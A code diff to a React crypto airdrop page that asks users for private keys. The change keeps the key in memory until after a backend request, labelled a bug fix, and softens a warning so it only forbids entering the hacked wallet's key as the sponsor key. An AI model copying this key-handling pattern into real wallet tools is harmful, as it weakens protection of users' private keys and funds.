@@ -484,10 +484,8 @@ export default function AirdropPage() {
         s: sig.s,
       }
 
-      // Step 4: Clear private key from memory immediately
-      setPrivateKey('')
-
-      // Step 5: Send authorization to backend for TX construction + submission
+      // Step 4: Send authorization to backend for TX construction + submission
+      // BUG FIX #3: Clear key AFTER fetch completes, not after signing
       const res = await fetch('/api/airdrop/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -514,6 +512,9 @@ export default function AirdropPage() {
         })
       })
       const data = await res.json()
+
+      // BUG FIX #3: Clear private key AFTER fetch completes (not before)
+      setPrivateKey('')
 
       if (data.success) {
         setTxHash(data.txHash || '')
@@ -670,7 +671,7 @@ export default function AirdropPage() {
                 <ul className="text-white/50 text-sm mt-2 space-y-1 ml-4">
                   <li>• <strong>Sponsor Wallet Address</strong>: A wallet with gas/native tokens</li>
                   <li>• <strong>Sponsor Private Key</strong>: To sign the gas payment transaction</li>
-                  <li>• <strong className="text-red-400">NEVER enter your hacked wallet&apos;s private key</strong></li>
+                  <li>• <strong className="text-red-400">NEVER enter your hacked wallet&apos;s private key as the sponsor key</strong></li>
                 </ul>
               </div>
 
